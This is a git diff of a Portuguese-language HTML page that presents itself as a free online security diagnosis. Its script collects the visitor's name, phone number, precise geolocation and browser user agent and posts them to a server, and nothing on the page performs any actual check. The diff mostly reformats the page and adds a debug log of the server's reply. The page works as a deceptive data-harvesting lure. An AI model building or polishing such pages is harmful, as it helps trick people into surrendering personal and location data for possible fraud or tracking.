@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,10 +8,12 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
+
 <body>
     <div class="container">
         <h1>🚀 Seu Diagnóstico de Segurança Online</h1>
-        <p>Descubra agora se sua conexão está exposta e receba um relatório exclusivo sobre sua segurança digital! 🔒</p>
+        <p>Descubra agora se sua conexão está exposta e receba um relatório exclusivo sobre sua segurança digital! 🔒
+        </p>
 
         <form id="dataForm">
             <label for="nome">👤 Seu Nome:</label>
@@ -29,7 +32,7 @@
     </div>
 
     <script>
-        document.getElementById('dataForm').addEventListener('submit', function(event) {
+        document.getElementById('dataForm').addEventListener('submit', function (event) {
             event.preventDefault();
 
             const nome = document.getElementById('nome').value;
@@ -38,7 +41,7 @@
             const userAgent = navigator.userAgent;
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
+                navigator.geolocation.getCurrentPosition(function (position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
@@ -53,17 +56,18 @@
                             telefone: telefone,
                             latitude: latitude,
                             longitude: longitude,
-                            user_agent: userAgent  // Alterado de 'userAgent' para 'user_agent'
+                            user_agent: userAgent
                         })
                     })
-                    .then(response => response.json())
-                    .then(data => {
-                        document.getElementById('responseMessage').innerHTML = `<p style="color: #0f0;">✅ Dados enviados! Em breve você receberá seu relatório.</p>`;
-                    })
-                    .catch(error => {
-                        console.error('Erro ao enviar dados:', error);
-                        document.getElementById('responseMessage').innerHTML = `<p style="color: red;">❌ Erro ao enviar dados.</p>`;
-                    });
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Resposta do servidor:', data); // Verifique o que o servidor retorna
+                            document.getElementById('responseMessage').innerHTML = `<p style="color: #0f0;">✅ Dados enviados! Em breve você receberá seu relatório.</p>`;
+                        })
+                        .catch(error => {
+                            console.error('Erro ao enviar dados:', error);
+                            document.getElementById('responseMessage').innerHTML = `<p style="color: red;">❌ Erro ao enviar dados.</p>`;
+                        });
                 });
             } else {
                 alert("Geolocalização não suportada pelo seu navegador.");
@@ -71,4 +75,5 @@
         });
     </script>
 </body>
+
 </html>
